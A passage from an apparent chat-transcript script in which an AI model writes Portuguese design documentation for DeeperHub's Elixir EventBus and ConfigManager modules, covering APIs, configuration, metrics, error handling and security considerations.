    *   Se `opts[:receive_past]` for `true`, recupera os eventos recentes do histórico para o tópico e os envia para o novo assinante.

### 5.3. Fluxo de Retentativa de Entrega

1.  **`DispatcherWorker`:** Detecta falha na entrega para um assinante.
2.  **`RetryManager`:**
    *   Recebe o evento e os detalhes da falha (ex: número de tentativas, último erro).
    *   Incrementa o contador de tentativas.
    *   Se o número máximo de tentativas não foi excedido:
        *   Calcula o próximo intervalo de retry (ex: backoff exponencial).
        *   Agenda o reenvio do evento para o `DispatcherWorker` após o intervalo.
    *   Se o número máximo de tentativas foi excedido:
        *   Move o evento para uma Dead-Letter Queue (DLQ) (se configurada).
        *   Registra a falha permanente.
3.  **`DispatcherWorker` (Reenvio):** Recebe o evento do `RetryManager` e tenta reenviá-lo.

## 📡 6. API (Funções Públicas)

### 6.1. `DeeperHub.Core.EventBus.publish(topic :: String.t() | atom() | list(atom()), payload :: term(), opts :: keyword()) :: :ok | {:error, term()}`

*   **Descrição:** Publica um evento no barramento para todos os assinantes interessados.
*   **`@spec`:** `publish(topic :: String.t() | atom() | list(atom()), payload :: term(), opts :: keyword()) :: :ok | {:error, term()}`
*   **Parâmetros:**
    *   `topic` (String | atom | list(atom)): O tópico do evento (ex: `\"user.created\"`, `:payment_processed`, `[:order, :item, :shipped]`).
    *   `payload` (term): Os dados associados ao evento. Deve ser um termo serializável se a persistência ou distribuição entre nós for usada.
    *   `opts` (keyword list): Opções adicionais:
        *   `:metadata` (map): Metadados personalizados a serem incluídos no evento. (Padrão: `%{}`)
        *   `:event_id` (String.t): Um ID de evento customizado. Se não fornecido, um UUID será gerado.
        *   `:timestamp` (DateTime.t): Timestamp customizado para o evento. Se não fornecido, `DateTime.utc_now()` será usado.
        *   `:retry_enabled` (boolean): Sobrescreve a configuração global de retry para este evento. (Padrão: usa config global)
        *   `:max_attempts` (pos_integer): Sobrescreve o número máximo de tentativas para este evento. (Padrão: usa config global)
        *   `:persistent` (boolean): Se este evento deve ser persistido (requer adaptador de storage configurado). (Padrão: `false`)
*   **Retorno:**
    *   `:ok`: Se o evento foi aceito para publicação.
    *   `{:error, reason}`: Se houve um erro ao tentar publicar (ex: validação do tópico/payload falhou).
*   **Exemplo de Uso (Elixir):**
    ```elixir
    payload = %{user_id: \"user123\", registration_method: \"email\"}
    metadata = %{source_module: MyModule, trace_id: \"trace-xyz\"}
    DeeperHub.Core.EventBus.publish(\"user.registered\", payload, metadata: metadata)
    ```

### 6.2. `DeeperHub.Core.EventBus.subscribe(topic_pattern :: String.t() | atom() | list(atom()), subscriber :: pid() | module() | {module(), term()} | {atom(), node()}, opts :: keyword()) :: :ok | {:error, term()}`

*   **Descrição:** Registra um `subscriber` para receber eventos que correspondam ao `topic_pattern`.
*   **`@spec`:** `subscribe(topic_pattern :: String.t() | atom() | list(atom()), subscriber :: pid() | module() | {module(), term()} | {atom(), node()}, opts :: keyword()) :: :ok | {:error, term()}`
*   **Parâmetros:**
    *   `topic_pattern` (String | atom | list(atom)): O padrão do tópico para assinar. Pode incluir wildcards (`*` para um segmento, `**` para múltiplos segmentos, ou conforme a implementação de matching).
    *   `subscriber`: O processo ou entidade que receberá os eventos.
        *   `pid()`: O PID do processo assinante.
        *   `module()`: Um módulo que implementa um callback `handle_event(topic, payload, metadata)`.
        *   `{module(), term()}`: Um módulo e um estado inicial para um worker dinâmico a ser iniciado.
        *   `{atom(), node()}`: Nome registrado de um processo (local ou remoto).
    *   `opts` (keyword list): Opções adicionais:
        *   `:receive_past` (boolean): Se `true`, envia os últimos N eventos do histórico para este tópico ao assinante. (Padrão: `false`)
        *   `:max_past_events` (pos_integer): Número máximo de eventos passados a serem enviados se `:receive_past` for `true`. (Padrão: config global)
        *   `:queue_opts` (keyword): Opções para a fila individual do assinante (se aplicável pela implementação).
*   **Retorno:**
    *   `:ok`: Assinatura bem-sucedida.
    *   `{:error, reason}`: Falha na assinatura.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    # Em um GenServer
    def init(_args) do
      DeeperHub.Core.EventBus.subscribe(\"user.*\", self())
      {:ok, %{}}
    end

    def handle_info({:event, topic, payload, metadata}, state) do
      Logger.info(\"Evento recebido: #{inspect(topic)} com payload: #{inspect(payload)}\", metadata)
      {:noreply, state}
    end
    ```

### 6.3. `DeeperHub.Core.EventBus.unsubscribe(topic_pattern :: String.t() | atom() | list(atom()), subscriber :: pid() | module() | {atom(), node()}) :: :ok`

*   **Descrição:** Remove uma assinatura específica.
*   **`@spec`:** `unsubscribe(topic_pattern :: String.t() | atom() | list(atom()), subscriber :: pid() | module() | {atom(), node()}) :: :ok`
*   **Parâmetros:**
    *   `topic_pattern`: O padrão do tópico da assinatura a ser removida.
    *   `subscriber`: O processo ou entidade que estava inscrito.
*   **Retorno:** `:ok`.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    DeeperHub.Core.EventBus.unsubscribe(\"user.*\", self())
    ```

### 6.4. `DeeperHub.Core.EventBus.unsubscribe_all(subscriber :: pid() | module() | {atom(), node()}) :: :ok`

*   **Descrição:** Remove todas as assinaturas de um `subscriber`.
*   **`@spec`:** `unsubscribe_all(subscriber :: pid() | module() | {atom(), node()}) :: :ok`
*   **Parâmetros:**
    *   `subscriber`: O processo ou entidade cujas assinaturas serão removidas.
*   **Retorno:** `:ok`.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    DeeperHub.Core.EventBus.unsubscribe_all(self())
    ```

### 6.5. `DeeperHub.Core.EventBus.get_event_history(topic :: String.t() | atom() | list(atom()), opts :: keyword()) :: {:ok, list(Event.t())} | {:error, :not_found | term()}` (Nova Funcionalidade)

*   **Descrição:** Recupera o histórico recente de eventos para um tópico específico. Requer que o histórico de eventos esteja habilitado e configurado.
*   **`@spec`:** `get_event_history(topic :: String.t() | atom() | list(atom()), opts :: keyword()) :: {:ok, list(map())} | {:error, :not_found | term()}`
*   **Parâmetros:**
    *   `topic`: O tópico exato do evento.
    *   `opts` (keyword list): Opções adicionais:
        *   `:limit` (pos_integer): Número máximo de eventos a retornar. (Padrão: config global de histórico)
        *   `:since_event_id` (String.t): Retorna eventos publicados após este ID de evento.
*   **Retorno:**
    *   `{:ok, events_list}`: Lista dos eventos históricos.
    *   `{:error, :not_found}`: Se o tópico não tiver histórico ou não existir.
    *   `{:error, :history_disabled}`: Se o histórico de eventos não estiver habilitado.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    case DeeperHub.Core.EventBus.get_event_history(\"user.created\", limit: 5) do
      {:ok, events} -> IO.inspect(events)
      {:error, reason} -> Logger.warn(\"Não foi possível obter histórico: #{reason}\")
    end
    ```

## ⚙️ 7. Configuração

O módulo `EventBus` é configurado através do `DeeperHub.Core.ConfigManager`.

*   **ConfigManager:**
    *   `[:core, :event_bus, :enabled]` (Boolean): Habilita/desabilita completamente o EventBus. (Padrão: `true`)
    *   `[:core, :event_bus, :history_enabled]` (Boolean): Habilita o armazenamento de histórico de eventos. (Padrão: `false`)
    *   `[:core, :event_bus, :history_limit_per_topic]` (Integer): Número máximo de eventos a serem mantidos no histórico por tópico. (Padrão: `100`)
    *   `[:core, :event_bus, :retry_enabled]` (Boolean): Habilita a lógica de retentativa para entrega de eventos. (Padrão: `true`)
    *   `[:core, :event_bus, :retry_max_attempts]` (Integer): Número máximo de tentativas de entrega. (Padrão: `5`)
    *   `[:core, :event_bus, :retry_base_interval_ms]` (Integer): Intervalo base (em ms) para a primeira retentativa. (Padrão: `1000`)
    *   `[:core, :event_bus, :retry_max_interval_ms]` (Integer): Intervalo máximo (em ms) entre retentativas (para backoff exponencial). (Padrão: `60000`)
    *   `[:core, :event_bus, :retry_backoff_strategy]` (Atom): Estratégia de backoff (:exponential, :fixed). (Padrão: `:exponential`)
    *   `[:core, :event_bus, :dispatcher_pool_size]` (Integer): Número de workers no pool de dispatchers. (Padrão: `System.schedulers_online() * 2`)
    *   `[:core, :event_bus, :storage_adapter]` (Module): Módulo adaptador para persistência de eventos (ex: `DeeperHub.Core.EventBus.Storage.DbStorage`). (Padrão: `DeeperHub.Core.EventBus.Storage.EtsStorage` para histórico em memória, ou `DeeperHub.Core.EventBus.Storage.NoOpStorage` se desabilitado)
    *   `[:core, :event_bus, :dlq_enabled]` (Boolean): Habilita Dead-Letter Queue para eventos que falham persistentemente. (Padrão: `false`)
    *   `[:core, :event_bus, :dlq_adapter]` (Module): Módulo adaptador para a DLQ. (Padrão: `nil`)

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter configurações de runtime.
*   `DeeperHub.Core.Logger`: Para registrar atividades e erros.
*   `DeeperHub.Core.Metrics`: Para emitir métricas de desempenho e saúde.
*   `DeeperHub.Core.Supervisor` (indireta): Para ser supervisionado.

### 8.2. Bibliotecas Externas

*   `Jason` (opcional): Se os payloads dos eventos precisarem ser serializados/desserializados para armazenamento persistente ou comunicação entre nós.
*   Pode depender de um cliente de sistema de filas (ex: `AMQP` para RabbitMQ, `Brody` para Kafka) se um `StorageAdapter` correspondente for usado para persistência avançada.

## 🤝 9. Como Usar / Integração

**Publicando um Evento:**
Qualquer módulo pode publicar um evento chamando a função `publish/3`.
```elixir
# Em um módulo qualquer
alias DeeperHub.Core.EventBus

def process_order(order) do
  # ... lógica de processamento ...
  EventBus.publish(\"order.processed\", %{order_id: order.id, status: \"completed\"})
  {:ok, order}
end
```

**Assinando Eventos (em um GenServer):**
```elixir
defmodule MyApp.OrderNotifier do
  use GenServer
  alias DeeperHub.Core.EventBus
  alias DeeperHub.Core.Logger # Exemplo

  def start_link(_opts) do
    GenServer.start_link(__MODULE__, :ok, name: __MODULE__)
  end

  @impl true
  def init(:ok) do
    Logger.info(\"OrderNotifier iniciando e assinando eventos...\")
    EventBus.subscribe(\"order.processed\", self())
    EventBus.subscribe(\"order.shipped\", self())
    # Assinar outros eventos relevantes
    {:ok, %{}}
  end

  @impl true
  def handle_info({:event, topic, payload, _metadata}, state) do
    Logger.info(\"Evento recebido no OrderNotifier: #{inspect(topic)}\", payload: payload)
    case topic do
      \"order.processed\" ->
        # Enviar notificação de pedido processado
        Logger.info(\"Enviando notificação de pedido processado para order_id: #{payload.order_id}\")
      \"order.shipped\" ->
        # Enviar notificação de pedido enviado
        Logger.info(\"Enviando notificação de pedido enviado para order_id: #{payload.order_id}\")
      _ ->
        :ok
    end
    {:noreply, state}
  end

  # Outros callbacks do GenServer...
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unitários para o `EventBus.Server` devem cobrir a lógica de gerenciamento de assinaturas, enfileiramento e histórico.
*   Testes para os `DispatcherWorker`s devem focar na entrega de mensagens e tratamento de falhas de assinantes.
*   Testes para o `RetryManager` devem verificar a lógica de agendamento e limites de retry.
*   Testes de integração devem simular a publicação e o recebimento de eventos por múltiplos assinantes, incluindo cenários de falha e retry.
*   Localização dos testes: `test/deeper_hub/core/event_bus/`

### 10.2. Métricas

*   **Contadores:**
    *   `deeper_hub.core.event_bus.event.published.count` (tags: `topic`): Número de eventos publicados.
    *   `deeper_hub.core.event_bus.event.delivered.count` (tags: `topic`, `subscriber_id`): Número de eventos entregues com sucesso a um assinante.
    *   `deeper_hub.core.event_bus.event.delivery_failed.count` (tags: `topic`, `subscriber_id`, `reason`): Número de falhas na entrega.
    *   `deeper_hub.core.event_bus.event.retried.count` (tags: `topic`, `subscriber_id`): Número de vezes que a entrega de um evento foi retentada.
    *   `deeper_hub.core.event_bus.event.dlq.count` (tags: `topic`): Número de eventos enviados para a Dead-Letter Queue.
    *   `deeper_hub.core.event_bus.subscriber.added.count` (tags: `topic`): Número de novas assinaturas.
    *   `deeper_hub.core.event_bus.subscriber.removed.count` (tags: `topic`): Número de assinaturas removidas.
*   **Gauges:**
    *   `deeper_hub.core.event_bus.queue.size.gauge` (tags: `topic` (opcional)): Tamanho da fila de eventos pendentes.
    *   `deeper_hub.core.event_bus.retry_queue.size.gauge`: Tamanho da fila de retentativas.
    *   `deeper_hub.core.event_bus.subscribers.active.gauge` (tags: `topic`): Número de assinantes ativos por tópico.
    *   `deeper_hub.core.event_bus.history.size.gauge` (tags: `topic`): Tamanho do buffer de histórico por tópico.
*   **Histogramas/Timers:**
    *   `deeper_hub.core.event_bus.publish.duration_ms` (Histograma): Duração para processar uma chamada de `publish`.
    *   `deeper_hub.core.event_bus.dispatch.duration_ms` (Histograma, tags: `topic`): Duração para despachar um evento para todos os seus assinantes (excluindo o tempo de processamento do assinante).
    *   `deeper_hub.core.event_bus.event_processing_latency_ms` (Histograma, tags: `topic`): Latência entre a publicação e a entrega bem-sucedida de um evento.

### 10.3. Logs

*   **Nível INFO:**
    *   Publicação de novos eventos (tópico, ID do evento, metadados relevantes).
    *   Assinatura/Cancelamento de assinatura (tópico, PID/nome do assinante).
    *   Entrega bem-sucedida de evento para um assinante.
    *   Início e fim de um ciclo de retry para um evento.
*   **Nível WARNING:**
    *   Falha na entrega de um evento para um assinante (antes de retry).
    *   Payload de evento grande que pode impactar performance.
    *   Fila de eventos ou fila de retry atingindo um limiar alto.
*   **Nível ERROR:**
    *   Falha persistente na entrega de um evento após todas as retentativas (movido para DLQ ou descartado).
    *   Erro interno no `EventBus.Server` ou workers.
    *   Falha ao persistir evento (se storage persistente estiver configurado).

### 10.4. Telemetria

O `EventBus` emite eventos Telemetry para permitir instrumentação fina e observabilidade.

*   `[:deeper_hub, :core, :event_bus, :publish, :start | :stop | :exception]`
    *   Medições: `%{duration: native_time}` (no `:stop`)
    *   Metadados: `%{topic: topic, payload_size: size, event_id: event_id, opts: opts}`
*   `[:deeper_hub, :core, :event_bus, :subscribe, :success | :failure]`
    *   Metadados: `%{topic_pattern: pattern, subscriber: subscriber, opts: opts, reason: reason_if_failure}`
*   `[:deeper_hub, :core, :event_bus, :dispatch, :start | :stop | :exception]` (para o lote de dispatch de um evento)
    *   Medições: `%{duration: native_time}`
    *   Metadados: `%{topic: topic, event_id: event_id, subscriber_count: count}`
*   `[:deeper_hub, :core, :event_bus, :delivery, :success | :failure | :retry]` (para entrega a um assinante individual)
    *   Metadados: `%{topic: topic, event_id: event_id, subscriber: subscriber, attempt: attempt_num, error: error_if_failure}`

## ❌ 11. Tratamento de Erros

*   **Falha de Assinante:** Se um processo assinante falhar ao receber ou processar um evento (ex: `send` para um PID morto, ou o assinante crasha), o `DispatcherWorker` detecta isso.
    *   O evento é encaminhado para o `RetryManager` se as retentativas estiverem habilitadas.
    *   A falha não impacta a entrega para outros assinantes do mesmo evento.
*   **Retries Excedidos:** Se um evento falhar em todas as tentativas de reenvio, ele é movido para uma Dead-Letter Queue (DLQ) configurada (se houver) ou descartado. Um log de erro é gerado.
*   **`EventBus.Server` Crash:** Sendo um GenServer supervisionado, será reiniciado pelo supervisor.
    *   Assinaturas em memória (ETS) serão perdidas e precisarão ser refeitas pelos assinantes ao reiniciarem.
    *   Eventos em filas internas em memória serão perdidos. Para evitar isso, um `StorageAdapter` com persistência (ex: DB, sistema de filas externo) seria necessário para a fila de eventos.
*   **Tópico Inválido ou Payload Inválido:** A função `publish/3` pode retornar `{:error, reason}` se o tópico ou payload não passarem em validações básicas.

## 🛡️ 12. Considerações de Segurança

*   **Sensibilidade do Payload:** Os payloads dos eventos podem conter dados sensíveis. Se o histórico de eventos ou a persistência de eventos estiverem habilitados, considerar:
    *   Criptografar payloads sensíveis antes de publicá-los.
    *   Filtrar dados sensíveis dos payloads antes do armazenamento no histórico/DLQ.
*   **Controle de Acesso à Publicação/Assinatura (Avançado):** Em sistemas maiores ou com múltiplos tenants, pode ser necessário controlar quais módulos/usuários podem publicar ou assinar determinados tópicos. Isso não parece ser uma necessidade inicial aqui, mas é uma consideração futura.
*   **Abuso de Publicação:** Um módulo defeituoso publicando um grande volume de eventos pode sobrecarregar o EventBus. Limites de taxa na publicação ou no tamanho da fila podem ser considerados, embora aumentem a complexidade.
*   **Segurança do Assinante:** Assinantes maliciosos ou comprometidos podem ganhar acesso a informações através dos eventos. O design deve garantir que os eventos contenham apenas as informações necessárias para os casos de uso legítimos.

## 🧑‍💻 13. Contribuição

*   **Nomeação de Tópicos:** Use um padrão consistente para nomear tópicos, por exemplo: `dominio.entidade.acao` (ex: `accounts.user.created`, `payments.transaction.succeeded`).
*   **Payloads de Eventos:** Defina structs ou mapas bem definidos para os payloads de cada tipo de evento. Considere versionar os schemas dos payloads se grandes mudanças forem esperadas.
*   **Idempotência de Assinantes:** Assinantes devem, idealmente, ser idempotentes no processamento de eventos, pois em alguns cenários de falha/retry, um evento pode ser entregue mais de uma vez.
*   **Testes:** Ao adicionar novos eventos ou assinantes, garanta que os testes cubram os fluxos de publicação e consumo.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar um `StorageAdapter` para persistir eventos em um banco de dados, garantindo a entrega mesmo após reinícios.
*   [ ] Desenvolver uma Dead-Letter Queue (DLQ) para eventos que falham consistentemente, permitindo análise e reprocessamento manual.
*   [ ] Adicionar suporte para filtragem de eventos no lado do assinante (assinante especifica um filtro além do tópico).
*   [ ] Explorar a integração com um sistema de filas externo mais robusto (RabbitMQ, Kafka) para cenários de alta carga ou necessidade de garantias de entrega mais fortes.
*   [ ] Adicionar uma interface de administração (Console ou Web) para visualizar o estado do EventBus, filas, assinantes e gerenciar a DLQ.
*   [ ] Implementar ordenação de eventos garantida por tópico (se necessário para casos de uso específicos).
*   [ ] Considerar \"eventos de resposta\" ou coreografia de saga para fluxos de trabalho mais complexos.

---

*Última atualização: 2025-05-11*

---

Este é um exemplo detalhado para o `DeeperHub.Core.EventBus`. Posso continuar com o próximo módulo, talvez o `DeeperHub.Core.ConfigManager` ou algum outro de sua preferência?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""proximo"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Excelente! Vamos prosseguir com a documentação do módulo `DeeperHub.Core.ConfigManager`. Este é outro componente crucial, pois centraliza a forma como o sistema acessa suas configurações.

---

# Módulo: `DeeperHub.Core.ConfigManager` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Core.ConfigManager`

O módulo `DeeperHub.Core.ConfigManager` é o serviço centralizado para gerenciar e acessar todas as configurações dinâmicas do sistema DeeperHub. Ele abstrai a origem das configurações (seja de arquivos de configuração, banco de dados, variáveis de ambiente ou um serviço de configuração externo), fornecendo uma interface unificada e consistente para todos os outros módulos.

Este módulo permite que as configurações sejam alteradas em tempo de execução (para aquelas que suportam isso) e notifica outros componentes do sistema sobre essas mudanças, permitindo uma adaptação dinâmica do comportamento da aplicação. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Acesso Unificado a Configurações:**
    *   Fornecer uma API simples para obter valores de configuração por chave e, opcionalmente, por escopo (`get/3`, `get_config/1`).
    *   Suportar valores padrão caso uma configuração não seja encontrada.
    *   Converter tipos de dados (ex: `get_integer/3`).
*   **Gerenciamento de Configurações (CRUD):**
    *   Permitir a criação, leitura, atualização e exclusão de configurações (para fontes de configuração que suportam isso, como um banco de dados).
    *   Validar os dados de configuração antes de salvá-los.
*   **Escopo de Configurações:**
    *   Suportar diferentes escopos para configurações (ex: `global`, `user_id:123`, `tenant:abc`).
    *   Resolver a precedência de escopos (ex: uma configuração específica de usuário sobrescreve uma global).
*   **Tipagem de Dados:**
    *   Armazenar e retornar configurações com tipos de dados corretos (string, integer, boolean, map, list).
*   **Sensibilidade de Dados:**
    *   Marcar configurações como sensíveis para evitar sua exposição indevida em logs ou APIs.
*   **Notificação de Mudanças:**
    *   Publicar eventos (via `Core.EventBus`) quando configurações são criadas, atualizadas ou excluídas.
    *   Permitir que outros módulos se inscrevam nessas notificações para reagir a mudanças de configuração.
*   **Cache de Configurações:**
    *   Implementar um cache para configurações frequentemente acessadas para melhorar o desempenho.
    *   Invalidar o cache automaticamente quando as configurações são alteradas.
*   **Carregamento de Configurações:**
    *   Carregar configurações de diferentes fontes na inicialização (ex: `config/*.exs`, variáveis de ambiente, banco de dados).
*   **Auditoria (Opcional):**
    *   Integrar com `DeeperHub.Audit` para registrar quem alterou qual configuração e quando.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.ConfigManager` (Fachada Pública):**
    *   **Responsabilidade:** Ponto de entrada para todas as interações com o sistema de configuração.
    *   **Interações:** Delega chamadas para o `ConfigManager.Server`.
2.  **`DeeperHub.Core.ConfigManager.Server` (GenServer):**
    *   **Responsabilidade:** Processo central que gerencia o estado das configurações, interage com o storage e o cache.
    *   **Estado Interno:**
        *   Cache de Configurações (provavelmente uma tabela ETS gerenciada pelo `ConfigManager.Cache`).
        *   Informações sobre as fontes de configuração.
    *   **Interações:** Recebe chamadas da fachada, interage com `StorageAdapter` para persistência e `Cache` para caching, e com `Core.EventBus` para notificar mudanças.
3.  **`DeeperHub.Core.ConfigManager.StorageAdapter` (Behaviour e Implementações):**
    *   **Responsabilidade:** Abstrair a camada de persistência das configurações.
    *   **Implementações:**
        *   `EctoStorage`: Para armazenar configurações no banco de dados principal.
        *   `FileStorage`: Para carregar configurações de arquivos (ex: arquivos `.yaml` ou `.json` adicionais).
        *   `EnvVarStorage`: Para carregar configurações de variáveis de ambiente.
        *   `CombinedStorage`: Para agregar configurações de múltiplas fontes com uma ordem de precedência definida.
4.  **`DeeperHub.Core.ConfigManager.Cache` (GenServer ou ETS direta):**
    *   **Responsabilidade:** Armazenar em cache as configurações para acesso rápido.
    *   **Interações:** Usado pelo `ConfigManager.Server` para reduzir acessos ao `StorageAdapter`.
5.  **`DeeperHub.Core.ConfigManager.Schema.Setting` (Ecto Schema):**
    *   **Responsabilidade:** Define a estrutura da tabela de configurações no banco de dados (se `EctoStorage` for usado). Inclui campos como `key`, `value`, `scope`, `data_type`, `is_sensitive`, `description`.
6.  **`DeeperHub.Core.ConfigManager.ChangeNotifier` (Opcional, pode ser parte do Server):**
    *   **Responsabilidade:** Publicar eventos no `Core.EventBus` quando configurações mudam.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/core/config_manager/
├── config_manager.ex             # Fachada Pública
├── server.ex                     # GenServer principal
├── cache.ex                      # Lógica de cache
├── change_notifier.ex            # Lógica de notificação de eventos
│
├── schema/
│   └── setting.ex                # Ecto Schema para configurações
│
├── storage/
│   ├── storage_adapter.ex        # Behaviour
│   ├── ecto_storage.ex           # Implementação com BD
│   ├── file_storage.ex           # Implementação com arquivos
│   ├── env_var_storage.ex        # Implementação com variáveis de ambiente
│   └── combined_storage.ex       # Implementação para múltiplas fontes
│
└── supervisor.ex                 # Supervisor para os processos do ConfigManager
```

### 3.3. Decisões de Design Importantes

*   **Centralização:** Um único ponto de verdade para todas as configurações da aplicação.
*   **Abstração de Fonte:** A forma como as configurações são armazenadas ou de onde vêm é transparente para os consumidores.
*   **Reatividade:** O sistema pode reagir dinamicamente a mudanças de configuração sem reinício.
*   **Performance:** O uso de cache é crucial para evitar gargalos no acesso a configurações.
*   **Segurança:** Configurações sensíveis são tratadas de forma apropriada.

## 🛠️ 4. Casos de Uso Principais

*   **Módulo Obtém Limite de Taxa:**
    *   O módulo `DeeperHub.API.RateLimiter` precisa saber o limite de requisições para um endpoint.
    *   Ele chama `DeeperHub.Core.ConfigManager.get(\"api.rate_limit.users_endpoint\", \"global\", 100)`.
*   **Administrador Altera Configuração de Email:**
    *   Um administrador, através de uma interface (Console ou Web), altera a configuração do servidor SMTP.
    *   A interface chama `DeeperHub.Core.ConfigManager.set(\"notifications.smtp.host\", \"new.smtp.server\", scope: \"global\", description: \"...\")`.
    *   O `ConfigManager` atualiza o valor no storage, invalida o cache e publica um evento `config_updated`.
    *   O módulo `DeeperHub.Notifications` (ou seu `Mailer`) recebe o evento e recarrega a configuração do SMTP.
*   **Definir Feature Flag:**
    *   O módulo `DeeperHub.FeatureFlags` usa o `ConfigManager` para armazenar e recuperar o estado das feature flags.
    *   Ex: `DeeperHub.Core.ConfigManager.get([:feature_flags, :new_dashboard, :enabled], \"global\", false)`.
*   **Carregamento Inicial:**
    *   Na inicialização da aplicação, o `ConfigManager` carrega as configurações de `config/runtime.exs`, variáveis de ambiente e do banco de dados.

## 🌊 5. Fluxos Importantes

### 5.1. Fluxo de Obtenção de Configuração (`get/3`)

1.  **Chamador:** Um módulo chama `DeeperHub.Core.ConfigManager.get(key, scope, default_value)`.
2.  **`ConfigManager.Server`:**
    *   Recebe a chamada.
    *   Primeiro, tenta obter o valor do `ConfigManager.Cache` usando a `key` e `scope`.
    *   **Cache Hit:** Se encontrado e não expirado, retorna o valor do cache.
    *   **Cache Miss:**
        *   Chama o `StorageAdapter` apropriado para obter o valor da fonte primária (ex: `EctoStorage.get_setting(key, scope)`).
        *   Se encontrado no storage:
            *   Armazena o valor no `ConfigManager.Cache` com um TTL.
            *   Retorna o valor.
        *   Se não encontrado no storage:
            *   Retorna o `default_value` fornecido.
3.  **Sensibilidade:** Se a configuração for marcada como `:is_sensitive` e o contexto de chamada não for privilegiado, o valor pode ser mascarado ou omitido (lógica a ser definida).

### 5.2. Fluxo de Atualização de Configuração (`set/3`)

1.  **Chamador:** Um módulo (geralmente uma interface administrativa ou processo de deploy) chama `DeeperHub.Core.ConfigManager.set(key, value, opts)`.
2.  **`ConfigManager.Server`:**
    *   Recebe a chamada.
    *   Valida os dados de entrada (tipo do valor, escopo, etc.).
    *   Chama o `StorageAdapter` para persistir a nova configuração (ex: `EctoStorage.update_setting(key, scope, value, opts)`).
    *   Se a persistência for bem-sucedida:
        *   Invalida/Atualiza a entrada correspondente no `ConfigManager.Cache`.
        *   Utiliza o `ChangeNotifier` para publicar um evento no `Core.EventBus` (ex: `event_bus.publish(\"configmanager.updated\", %{key: key, scope: scope, new_value: value})`).
    *   Retorna `{:ok, setting}` ou `{:error, reason}`.

## 📡 6. API (Funções Públicas da Fachada)

### 6.1. `DeeperHub.Core.ConfigManager.get(key :: String.t() | list(atom()), scope :: String.t() | nil, default :: term() | nil) :: term()`

*   **Descrição:** Obtém o valor de uma configuração. Se a chave for uma lista de átomos (ex: `[:service, :feature, :enabled]`), ela é convertida internamente para uma string (ex: `\"service.feature.enabled\"`).
*   **`@spec`:** `get(key :: String.t() | list(atom()), scope :: String.t() | nil, default :: term() | nil) :: term()`
*   **Parâmetros:**
    *   `key`: A chave da configuração. Pode ser uma string `a.b.c` ou uma lista `[:a, :b, :c]`.
    *   `scope`: O escopo da configuração (ex: `\"global\"`, `\"user_id:123\"`). Se `nil`, geralmente assume `\"global\"`.
    *   `default`: O valor a ser retornado se a configuração não for encontrada.
*   **Retorno:** O valor da configuração ou o valor `default`.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    timeout = DeeperHub.Core.ConfigManager.get(\"app.request_timeout_ms\", \"global\", 5000)
    feature_enabled = DeeperHub.Core.ConfigManager.get([:features, :new_reporting, :enabled], \"tenant:abc\", false)
    ```

### 6.2. `DeeperHub.Core.ConfigManager.get_config(keys :: list(atom() | String.t()), default :: term() | nil) :: term()`

*   **Descrição:** Similar a `get/3` mas assume escopo global e aceita uma lista de chaves para construir o nome da configuração.
*   **`@spec`:** `get_config(keys :: list(atom() | String.t()), default :: term() | nil) :: term()`
*   **Parâmetros:**
    *   `keys`: Lista de átomos ou strings para formar a chave da configuração (ex: `[:myapp, :feature_x, :timeout]`).
    *   `default`: O valor padrão.
*   **Retorno:** O valor da configuração ou o valor `default`.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    api_key = DeeperHub.Core.ConfigManager.get_config([:external_services, :weather_api, :key], nil)
    ```

### 6.3. `DeeperHub.Core.ConfigManager.set(key :: String.t() | list(atom()), value :: term(), opts :: keyword()) :: {:ok, Setting.t()} | {:error, Ecto.Changeset.t() | term()}`

*   **Descrição:** Define ou atualiza o valor de uma configuração.
*   **`@spec`:** `set(key :: String.t() | list(atom()), value :: term(), opts :: keyword()) :: {:ok, map()} | {:error, term()}`
*   **Parâmetros:**
    *   `key`: A chave da configuração.
    *   `value`: O novo valor para a configuração.
    *   `opts`: Lista de opções:
        *   `:scope` (String): O escopo da configuração. (Padrão: `\"global\"`)
        *   `:data_type` (Atom): O tipo de dado do valor (ex: `:string`, `:integer`, `:boolean`, `:map`, `:list`). Se omitido, tenta inferir.
        *   `:description` (String): Uma descrição da configuração.
        *   `:is_sensitive` (Boolean): Indica se a configuração contém dados sensíveis. (Padrão: `false`)
        *   `:created_by` (String): Identificador de quem está fazendo a alteração (para auditoria).
*   **Retorno:**
    *   `{:ok, setting}`: Em caso de sucesso, retorna a struct da configuração salva (ex: `DeeperHub.Core.ConfigManager.Schema.Setting.t()`).
    *   `{:error, changeset}`: Se houver falha na validação.
    *   `{:error, reason}`: Para outros erros.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    opts = [
      scope: \"global\",
      data_type: :integer,
      description: \"Timeout para requisições à API externa X.\",
      is_sensitive: false,
      created_by: \"admin_user_id\"
    ]
    case DeeperHub.Core.ConfigManager.set(\"external_api.timeout\", 10000, opts) do
      {:ok, setting} -> Logger.info(\"Configuração '#{setting.key}' atualizada.\")
      {:error, reason} -> Logger.error(\"Falha ao atualizar configuração: #{inspect(reason)}\")
    end
    ```

### 6.4. `DeeperHub.Core.ConfigManager.delete(key :: String.t() | list(atom()), scope :: String.t() | nil, opts :: keyword()) :: {:ok, Setting.t()} | {:error, :not_found | term()}`

*   **Descrição:** Remove uma configuração.
*   **`@spec`:** `delete(key :: String.t() | list(atom()), scope :: String.t() | nil, opts :: keyword()) :: {:ok, map()} | {:error, term()}`
*   **Parâmetros:**
    *   `key`: A chave da configuração.
    *   `scope`: O escopo da configuração. (Padrão: `\"global\"`)
    *   `opts`: Lista de opções:
        *   `:deleted_by` (String): Identificador de quem está fazendo a remoção (para auditoria).
